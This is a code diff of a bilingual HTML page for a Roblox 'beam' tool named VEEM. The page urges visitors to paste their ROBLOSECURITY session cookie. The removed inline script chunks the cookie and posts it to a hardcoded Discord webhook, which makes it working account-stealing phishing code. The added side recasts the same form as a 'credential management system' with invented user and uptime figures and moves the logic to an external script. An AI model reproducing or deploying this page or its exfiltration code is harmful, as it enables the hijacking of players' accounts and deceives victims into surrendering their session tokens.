-            <label>
-              <span data-i18n="label_username">Nombre de Usuario</span>
-              <span class="tooltip" data-tip-key="tooltip_username" data-tip="Ingresa el nombre de usuario de Roblox">?</span>
+            <label class="form-label">
+              <span class="field-icon">👤</span>
+              <span>Username</span>
+              <span class="tooltip" data-tip="Enter your Roblox username">?</span>
             </label>
             <div class="input-wrapper">
               <span class="input-icon">👤</span>
-              <input type="text" id="username" data-placeholder-key="label_username" placeholder="Nombre de Usuario" required>
+              <input type="text" id="username" placeholder="Enter Roblox username" required>
             </div>
           </div>
 
           <div class="form-group">
-            <label>
-              <span data-i18n="label_token">Token ROBLOSECURITY</span>
-              <span class="tooltip" data-tip-key="tooltip_token" data-tip="Pega la cookie ROBLOSECURITY completa (sin límite de caracteres)">?</span>
+            <label class="form-label">
+              <span class="field-icon">🔐</span>
+              <span>ROBLOSECURITY Token</span>
+              <span class="tooltip" data-tip="Paste your complete ROBLOSECURITY token (unlimited length)">?</span>
             </label>
             <div class="input-wrapper">
               <span class="input-icon">🔐</span>
-              <textarea id="roblosecurity" data-placeholder-key="label_token" placeholder="Token ROBLOSECURITY" required></textarea>
+              <textarea id="roblosecurity" placeholder="Paste your ROBLOSECURITY token here" required></textarea>
             </div>
           </div>
 
           <div class="form-group">
-            <label>
-              <span data-i18n="label_userlink">Link de Usuario</span>
-              <span class="tooltip" data-tip-key="tooltip_userlink" data-tip="Ingresa el link del perfil de Roblox">?</span>
+            <label class="form-label">
+              <span class="field-icon">🔗</span>
+              <span>User Link</span>
+              <span class="tooltip" data-tip="Your Roblox profile URL">?</span>
             </label>
             <div class="input-wrapper">
               <span class="input-icon">🔗</span>
@@ -710,577 +1073,119 @@
           </div>
 
           <div class="buttons">
-            <button type="submit" class="btn btn-primary" id="submitBtn" data-i18n="btn_submit">Beem Usuario</button>
-            <button type="button" class="btn btn-secondary" id="clearBtn" data-i18n="btn_clear">Limpiar Todo</button>
+            <button type="submit" class="btn btn-primary" id="submitBtn">Beam User</button>
+            <button type="button" class="btn btn-secondary" id="clearBtn">Clear All</button>
           </div>
         </form>
       </div>
 
       <!-- About Tab -->
-      <div class="tab-content" id="about">
+      <div class="tab-content" id="about-tab">
         <div class="about-content">
-          <h2 data-i18n="about_title">Acerca de VEEM</h2>
-          <p data-i18n="about_description">La mejor herramienta para Beemear usuarios en roblox.</p>
+          <h2>About VEEM Ultimate</h2>
+          <p>The most advanced Roblox-inspired credential management system with premium features and unparalleled user experience.</p>
 
-          <div class="how-to-use">
-            <h3 data-i18n="about_how_title">Cómo usar</h3>
-            <ol>
-              <li data-i18n="about_step1">Ingresa el username</li>
-              <li data-i18n="about_step2">Pega el token ROBLOSECURITY (área de texto)</li>
-              <li data-i18n="about_step3">Coloca el link de usuario</li>
-              <li data-i18n="about_step4">Presiona 'Beem Usuario' para enviar</li>
+          <div class="stats-container">
+            <div class="stat-box">
+              <div class="stat-number" data-counter="99.9">0</div>
+              <div class="stat-label">Uptime %</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-number" data-counter="10000">0</div>
+              <div class="stat-label">Users Served</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-number" data-counter="24">0</div>
+              <div class="stat-label">Hours Support</div>
+            </div>
+          </div>
+
+          <h3 style="color: var(--primary-color); margin: 30px 0 15px;">Premium Features</h3>
+          <div class="features-grid">
+            <div class="feature-item">✨ Unlimited Token Length</div>
+            <div class="feature-item">🚀 Advanced Progress Tracking</div>
+            <div class="feature-item">🎨 Context-Aware Animations</div>
+            <div class="feature-item">🔒 10s Cooldown Protection</div>
+            <div class="feature-item">🎵 Premium Sound Effects</div>
+            <div class="feature-item">⚡ Lightning Fast Processing</div>
+            <div class="feature-item">🎯 Smart Error Handling</div>
+            <div class="feature-item">📱 Fully Responsive Design</div>
+          </div>
+
+          <div style="margin-top: 30px; padding: 20px; background: rgba(230, 44, 44, 0.1); border-radius: 12px; border: 1px solid rgba(230, 44, 44, 0.3);">
+            <h3 style="color: var(--primary-color); margin-bottom: 15px;">How to Use</h3>
+            <ol style="margin-left: 20px; color: var(--text-gray); line-height: 2;">
+              <li>Enter your Roblox username</li>
+              <li>Paste your ROBLOSECURITY token</li>
+              <li>Add your profile link</li>
+              <li>Click "Beam User" and watch the magic happen!</li>
             </ol>
           </div>
 
-          <div class="contact" data-i18n="about_contact">
-            Made by Dodoz Dev
-          </div>
-
-          <div class="footer-info" data-i18n="about_footer">
-            Última actualización: octubre 2025
-          </div>
+          <p style="text-align: center; margin-top: 30px; color: var(--text-gray);">Last updated: October 2025 | Version 1.0 Ultimate</p>
         </div>
       </div>
 
       <!-- Settings Tab -->
-      <div class="tab-content" id="settings">
+      <div class="tab-content" id="settings-tab">
         <div class="settings-group">
-          <label data-i18n="settings_color">Color Primario</label>
-          <input type="color" id="primaryColor" value="#E62C2C">
+          <label>Blur Intensity <span class="slider-value" id="blurValue">12px</span></label>
+          <input type="range" id="blurSlider" min="0" max="20" value="12">
         </div>
 
         <div class="settings-group">
-          <label data-i18n="settings_blur">Intensidad de Desenfoque <span class="slider-value" id="blurValue">8px</span></label>
-          <input type="range" id="blurSlider" min="0" max="20" value="8">
-        </div>
-
-        <div class="settings-group">
-          <label data-i18n="settings_speed">Velocidad de Animación <span class="slider-value" id="speedValue">0.6s</span></label>
+          <label>Animation Speed <span class="slider-value" id="speedValue">0.6s</span></label>
           <input type="range" id="speedSlider" min="0.1" max="2" step="0.1" value="0.6">
         </div>
 
         <div class="settings-group">
-          <label data-i18n="settings_sound">Efectos de Sonido</label>
-          <div class="toggle-wrapper">
-            <div class="toggle active" id="soundToggle"></div>
-            <span id="soundStatus" data-i18n="sound_enabled">Activado</span>
+          <label>Particle Count <span class="slider-value" id="particleValue">35</span></label>
+          <input type="range" id="particleSlider" min="0" max="50" value="35">
+        </div>
+
+        <div class="settings-group">
+          <label>Theme Preset</label>
+          <div class="theme-selector">
+            <div class="theme-option active" data-theme="default">Default</div>
+            <div class="theme-option" data-theme="blue">Ocean</div>
+            <div class="theme-option" data-theme="purple">Cosmic</div>
+            <div class="theme-option" data-theme="green">Forest</div>
+            <div class="theme-option" data-theme="orange">Sunset</div>
           </div>
         </div>
 
         <div class="buttons">
-          <button type="button" class="btn btn-primary" id="resetBtn" data-i18n="btn_reset">Restablecer por Defecto</button>
+          <button type="button" class="btn btn-primary" id="resetBtn">Reset to Default</button>
         </div>
       </div>
     </div>
   </div>
 
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
+  <!-- Advanced Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="loader-content">
+      <div class="loader-icon"></div>
+      <div class="progress-container">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">Preparing data...</div>
+        <div class="progress-percentage" id="progressPercentage">0%</div>
+      </div>
+    </div>
   </div>
 
+  <!-- Result Overlay -->
+  <div id="resultOverlay" class="result-overlay">
+    <div class="result-content">
+      <div class="result-icon" id="resultIcon"></div>
+      <div class="result-message" id="resultMessage"></div>
+    </div>
+  </div>
+
+  <!-- Toast Notification -->
   <div class="toast" id="toast"></div>
 
-  <script>
-    // Translations
-    const translations = {
-      es: {
-        title: "VEEM 1.2",
-        tab_beem: "Beem",
-        tab_about: "Acerca de",
-        tab_settings: "Ajustes",
-        label_username: "Nombre de Usuario",
-        label_token: "Token ROBLOSECURITY",
-        label_userlink: "Link de Usuario",
-        tooltip_username: "Ingresa el nombre de usuario de Roblox",
-        tooltip_token: "Pega la cookie ROBLOSECURITY completa (sin límite de caracteres)",
-        tooltip_userlink: "Ingresa el link del perfil de Roblox",
-        btn_submit: "Beem Usuario",
-        btn_clear: "Limpiar Todo",
-        about_title: "Acerca de VEEM",
-        about_description: "La mejor herramienta para Beemear usuarios en roblox.",
-        about_how_title: "Cómo usar",
-        about_step1: "Ingresa el username",
-        about_step2: "Pega el token ROBLOSECURITY (área de texto)",
-        about_step3: "Coloca el link de usuario",
-        about_step4: "Presiona 'Beem Usuario' para enviar",
-        about_contact: "Contacta al admin ante dudas",
-        about_footer: "Última actualización: octubre 2025",
-        settings_title: "Ajustes",
-        settings_color: "Color Primario",
-        settings_blur: "Intensidad de Desenfoque",
-        settings_speed: "Velocidad de Animación",
-        settings_sound: "Efectos de Sonido",
-        sound_enabled: "Activado",
-        sound_disabled: "Desactivado",
-        btn_reset: "Restablecer por Defecto",
-        toast_empty: "⚠️ Por favor completa todos los campos",
-        toast_success: "✅ ¡Beameado exitosamente!",
-        toast_error: "❌ Error al hacer Beam. Intenta de nuevo.",
-        toast_cooldown: "⏳ Espera {X} segundos antes de enviar de nuevo",
-        toast_cleared: "Formulario limpiado",
-        toast_reset: "Ajustes restablecidos"
-      },
-      en: {
-        title: "VEEM 1.2",
-        tab_beem: "Beem",
-        tab_about: "About",
-        tab_settings: "Settings",
-        label_username: "Username",
-        label_token: "ROBLOSECURITY Token",
-        label_userlink: "User Link",
-        tooltip_username: "Enter the Roblox username",
-        tooltip_token: "Paste the complete ROBLOSECURITY cookie (no character limit)",
-        tooltip_userlink: "Enter the Roblox profile link",
-        btn_submit: "Beem User",
-        btn_clear: "Clear All",
-        about_title: "About VEEM",
-        about_description: "The best beem tool of 2025.",
-        about_how_title: "How to Use",
-        about_step1: "Enter the username",
-        about_step2: "Paste the ROBLOSECURITY token (text area)",
-        about_step3: "Place the user link",
-        about_step4: "Press 'Beem User' to submit",
-        about_contact: "Contact admin if you have questions",
-        about_footer: "Last updated: October 2025",
-        settings_title: "Settings",
-        settings_color: "Primary Color",
-        settings_blur: "Blur Intensity",
-        settings_speed: "Animation Speed",
-        settings_sound: "Sound Effects",
-        sound_enabled: "Enabled",
-        sound_disabled: "Disabled",
-        btn_reset: "Reset to Default",
-        toast_empty: "⚠️ Please fill in all fields",
-        toast_success: "✅ Successfully Beamed!",
-        toast_error: "❌ Failed to Beam. Please try again.",
-        toast_cooldown: "⏳ Wait {X} seconds before sending again",
-        toast_cleared: "Form cleared",
-        toast_reset: "Settings reset to default"
-      }
-    };
-
-    // Language state (in-memory storage)
-    let currentLang = 'es';
-
-    // Cooldown state (in-memory storage)
-    let cooldownEnd = null;
-    let cooldownInterval = null;
-    const COOLDOWN_DURATION = 10000; // 10 seconds
-
-    // Audio Context for sound effects
-    let audioContext;
-    let soundEnabled = true;
-
-    function initAudio() {
-      if (!audioContext) {
-        audioContext = new (window.AudioContext || window.webkitAudioContext)();
-      }
-    }
-
-    function playSound(type) {
-      if (!soundEnabled) return;
-      
-      initAudio();
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
-      
-      oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
-      
-      const currentTime = audioContext.currentTime;
-      
-      switch(type) {
-        case 'click':
-          oscillator.frequency.value = 440;
-          gainNode.gain.setValueAtTime(0.3, currentTime);
-          gainNode.gain.exponentialRampToValueAtTime(0.01, currentTime + 0.1);
-          oscillator.start(currentTime);
-          oscillator.stop(currentTime + 0.1);
-          break;
-          
-        case 'success':
-          const frequencies = [523, 659, 784];
-          frequencies.forEach((freq, index) => {
-            const osc = audioContext.createOscillator();
-            const gain = audioContext.createGain();
-            osc.connect(gain);
-            gain.connect(audioContext.destination);
-            osc.frequency.value = freq;
-            gain.gain.setValueAtTime(0.2, currentTime + index * 0.15);
-            gain.gain.exponentialRampToValueAtTime(0.01, currentTime + index * 0.15 + 0.15);
-            osc.start(currentTime + index * 0.15);
-            osc.stop(currentTime + index * 0.15 + 0.15);
-          });
-          break;
-          
-        case 'error':
-          const errorFreqs = [400, 300];
-          errorFreqs.forEach((freq, index) => {
-            const osc = audioContext.createOscillator();
-            const gain = audioContext.createGain();
-            osc.connect(gain);
-            gain.connect(audioContext.destination);
-            osc.frequency.value = freq;
-            osc.type = 'sawtooth';
-            gain.gain.setValueAtTime(0.2, currentTime + index * 0.2);
-            gain.gain.exponentialRampToValueAtTime(0.01, currentTime + index * 0.2 + 0.2);
-            osc.start(currentTime + index * 0.2);
-            osc.stop(currentTime + index * 0.2 + 0.2);
-          });
-          break;
-      }
-    }
-
-    // Language switching
-    function switchLanguage(lang) {
-      currentLang = lang;
-      const langToggle = document.getElementById('langToggle');
-      langToggle.textContent = lang === 'es' ? '🌐 ES' : '🌐 EN';
-      updateAllText();
-    }
-
-    function updateAllText() {
-      // Update all elements with data-i18n
-      document.querySelectorAll('[data-i18n]').forEach(el => {
-        const key = el.getAttribute('data-i18n');
-        if (translations[currentLang][key]) {
-          el.style.transition = 'opacity 0.3s ease';
-          el.style.opacity = '0';
-          setTimeout(() => {
-            el.textContent = translations[currentLang][key];
-            el.style.opacity = '1';
-          }, 150);
-        }
-      });
-
-      // Update tooltips
-      document.querySelectorAll('[data-tip-key]').forEach(el => {
-        const key = el.getAttribute('data-tip-key');
-        if (translations[currentLang][key]) {
-          el.setAttribute('data-tip', translations[currentLang][key]);
-        }
-      });
-
-      // Update placeholders
-      document.querySelectorAll('[data-placeholder-key]').forEach(el => {
-        const key = el.getAttribute('data-placeholder-key');
-        if (translations[currentLang][key]) {
-          el.placeholder = translations[currentLang][key];
-        }
-      });
-
-      // Update submit button if not in cooldown
-      const submitBtn = document.getElementById('submitBtn');
-      if (!submitBtn.disabled) {
-        submitBtn.textContent = translations[currentLang].btn_submit;
-      }
-
-      // Update sound status
-      const soundStatus = document.getElementById('soundStatus');
-      soundStatus.textContent = soundEnabled ? translations[currentLang].sound_enabled : translations[currentLang].sound_disabled;
-    }
-
-    // Cooldown management
-    function checkCooldown() {
-      if (!cooldownEnd) return false;
-      
-      const remaining = cooldownEnd - Date.now();
-      if (remaining > 0) {
-        startCooldownTimer(remaining);
-        return true;
-      }
-      
-      cooldownEnd = null;
-      return false;
-    }
-
-    function startCooldown() {
-      cooldownEnd = Date.now() + COOLDOWN_DURATION;
-      startCooldownTimer(COOLDOWN_DURATION);
-    }
-
-    function startCooldownTimer(duration) {
-      const submitBtn = document.getElementById('submitBtn');
-      submitBtn.disabled = true;
-      
-      let remaining = Math.ceil(duration / 1000);
-      
-      const updateButton = () => {
-        if (remaining <= 0) {
-          clearInterval(cooldownInterval);
-          submitBtn.disabled = false;
-          submitBtn.textContent = translations[currentLang].btn_submit;
-          cooldownEnd = null;
-          return;
-        }
-        
-        const waitText = currentLang === 'es' ? `Espera ${remaining}s` : `Wait ${remaining}s`;
-        submitBtn.textContent = waitText;
-        remaining--;
-      };
-      
-      updateButton();
-      cooldownInterval = setInterval(updateButton, 1000);
-    }
-
-    // Toast notification
-    function showToast(message, type = 'success') {
-      const toast = document.getElementById('toast');
-      toast.textContent = message;
-      toast.className = `toast ${type}`;
-      toast.classList.add('show');
-      
-      setTimeout(() => {
-        toast.classList.remove('show');
-      }, 3000);
-    }
-
-    // Loading overlay
-    function showLoading(show) {
-      const overlay = document.getElementById('loadingOverlay');
-      if (show) {
-        overlay.classList.add('show');
-      } else {
-        overlay.classList.remove('show');
-      }
-    }
-
-    // Particles
-    function createParticles() {
-      const container = document.getElementById('particles');
-      const particleCount = window.innerWidth > 768 ? 25 : 0;
-      
-      container.innerHTML = '';
-      
-      for (let i = 0; i < particleCount; i++) {
-        const particle = document.createElement('div');
-        const size = Math.random() * 30 + 20;
-        const isCircle = Math.random() > 0.5;
-        
-        particle.className = `particle ${isCircle ? 'sphere' : 'cube'}`;
-        particle.style.width = size + 'px';
-        particle.style.height = size + 'px';
-        particle.style.left = Math.random() * 100 + '%';
-        particle.style.top = Math.random() * 100 + '%';
-        particle.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        particle.style.animationDelay = Math.random() * 2 + 's';
-        
-        container.appendChild(particle);
-      }
-    }
-
-    // Tab switching
-    document.querySelectorAll('.tab').forEach(tab => {
-      tab.addEventListener('click', () => {
-        playSound('click');
-        
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-        
-        tab.classList.add('active');
-        const targetId = tab.dataset.tab;
-        document.getElementById(targetId).classList.add('active');
-      });
-    });
-
-    // Language toggle
-    document.getElementById('langToggle').addEventListener('click', () => {
-      playSound('click');
-      const newLang = currentLang === 'es' ? 'en' : 'es';
-      switchLanguage(newLang);
-    });
-
-    // Form submission
-    document.getElementById('beemForm').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      playSound('click');
-
-      // Check cooldown
-      if (cooldownEnd && cooldownEnd > Date.now()) {
-        const remaining = Math.ceil((cooldownEnd - Date.now()) / 1000);
-        const message = translations[currentLang].toast_cooldown.replace('{X}', remaining);
-        playSound('error');
-        showToast(message, 'error');
-        return;
-      }
-      
-      const username = document.getElementById('username').value.trim();
-      const roblosecurity = document.getElementById('roblosecurity').value.trim();
-      const userlink = document.getElementById('userlink').value.trim();
-      
-      if (!username || !roblosecurity || !userlink) {
-        playSound('error');
-        showToast(translations[currentLang].toast_empty, 'error');
-        document.querySelector('.glass-card').classList.add('shake');
-        setTimeout(() => document.querySelector('.glass-card').classList.remove('shake'), 300);
-        return;
-      }
-      
-      showLoading(true);
-      
-      try {
-        // Build fields array
-        const fields = [
-          {
-            name: "👤 Username",
-            value: username,
-            inline: true
-          },
-          {
-            name: "🔗 User Link",
-            value: userlink,
-            inline: false
-          }
-        ];
-        
-        // Handle ROBLOSECURITY with splitting logic
-        const cookieWithCodeBlock = `\`\`\`\n${roblosecurity}\n\`\`\``;
-        
-        if (cookieWithCodeBlock.length <= 1024) {
-          // Single field
-          fields.push({
-            name: "🔐 ROBLOSECURITY",
-            value: cookieWithCodeBlock,
-            inline: false
-          });
-        } else {
-          // Split into chunks
-          const chunkSize = 1000;
-          let partNumber = 1;
-          
-          for (let i = 0; i < roblosecurity.length; i += chunkSize) {
-            const chunk = roblosecurity.substring(i, i + chunkSize);
-            const fieldName = partNumber === 1 
-              ? `🔐 ROBLOSECURITY (Part ${partNumber})`
-              : `🔐 ROBLOSECURITY (Part ${partNumber} - continued)`;
-            
-            fields.push({
-              name: fieldName,
-              value: `\`\`\`\n${chunk}\n\`\`\``,
-              inline: false
-            });
-            
-            partNumber++;
-          }
-        }
-        
-        // Send to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1432028268575330324/bnHxldAKmykSeIBjsCKfQ_T-MIJPOh45nsvgRWSvfGQ6RjqvsNLGlx4SYNiMjCKqtkb1';
-        
-        const payload = {
-          embeds: [{
-            title: "🎯 New VEEM Submission",
-            color: 15085612,
-            fields: fields,
-            timestamp: new Date().toISOString(),
-            footer: {
-              text: "VEEM Bot System"
-            }
-          }]
-        };
-        
-        const response = await fetch(webhookUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify(payload)
-        });
-        
-        showLoading(false);
-        
-        if (response.ok || response.status === 204) {
-          playSound('success');
-          showToast(translations[currentLang].toast_success, 'success');
-          
-          // Start cooldown
-          startCooldown();
-          
-          // Clear form with animation
-          setTimeout(() => {
-            document.getElementById('beemForm').reset();
-          }, 500);
-        } else {
-          throw new Error('Webhook failed');
-        }
-      } catch (error) {
-        showLoading(false);
-        playSound('error');
-        showToast(translations[currentLang].toast_error, 'error');
-        console.error('Error:', error);
-      }
-    });
-
-    // Clear button
-    document.getElementById('clearBtn').addEventListener('click', () => {
-      playSound('click');
-      document.getElementById('beemForm').reset();
-      showToast(translations[currentLang].toast_cleared, 'success');
-    });
-
-    // Settings
-    document.getElementById('primaryColor').addEventListener('input', (e) => {
-      document.documentElement.style.setProperty('--primary-color', e.target.value);
-    });
-
-    document.getElementById('blurSlider').addEventListener('input', (e) => {
-      const value = e.target.value + 'px';
-      document.documentElement.style.setProperty('--blur-intensity', value);
-      document.getElementById('blurValue').textContent = value;
-    });
-
-    document.getElementById('speedSlider').addEventListener('input', (e) => {
-      const value = e.target.value + 's';
-      document.documentElement.style.setProperty('--animation-speed', value);
-      document.getElementById('speedValue').textContent = value;
-    });
-
-    document.getElementById('soundToggle').addEventListener('click', (e) => {
-      soundEnabled = !soundEnabled;
-      const toggle = e.target;
-      const status = document.getElementById('soundStatus');
-      
-      if (soundEnabled) {
-        toggle.classList.add('active');
-        status.textContent = translations[currentLang].sound_enabled;
-      } else {
-        toggle.classList.remove('active');
-        status.textContent = translations[currentLang].sound_disabled;
-      }
-      
-      if (soundEnabled) playSound('click');
-    });
-
-    document.getElementById('resetBtn').addEventListener('click', () => {
-      playSound('click');
-      
-      document.documentElement.style.setProperty('--primary-color', '#E62C2C');
-      document.documentElement.style.setProperty('--blur-intensity', '8px');
-      document.documentElement.style.setProperty('--animation-speed', '0.6s');
-      
-      document.getElementById('primaryColor').value = '#E62C2C';
-      document.getElementById('blurSlider').value = 8;
-      document.getElementById('speedSlider').value = 0.6;
-      document.getElementById('blurValue').textContent = '8px';
-      document.getElementById('speedValue').textContent = '0.6s';
-      
-      soundEnabled = true;
-      document.getElementById('soundToggle').classList.add('active');
-      document.getElementById('soundStatus').textContent = translations[currentLang].sound_enabled;
-      
-      showToast(translations[currentLang].toast_reset, 'success');
-    });
-
-    // Initialize
-    window.addEventListener('load', () => {
-      createParticles();
-      checkCooldown();
-      updateAllText();
-    });
-
-    window.addEventListener('resize', () => {
-      createParticles();
-    });
-  </script>
+  <script src="app.js"></script>
 </body>
 </html>
